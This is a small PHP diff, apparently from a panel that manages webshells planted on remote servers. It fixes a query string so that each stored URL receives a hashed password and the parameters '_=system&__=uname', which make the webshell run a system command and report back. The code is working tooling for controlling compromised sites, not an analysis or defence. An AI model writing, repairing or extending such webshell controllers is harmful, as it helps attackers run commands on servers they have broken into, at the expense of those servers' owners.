@@ -189,7 +189,7 @@ $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '_=system&__=uname');
+$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $status = 'OK';
 $os = explode("{:|", $source);
@@ -1934,4 +1934,3 @@ mysqli_close($conn);
 checksql();
 
 ?>
-	
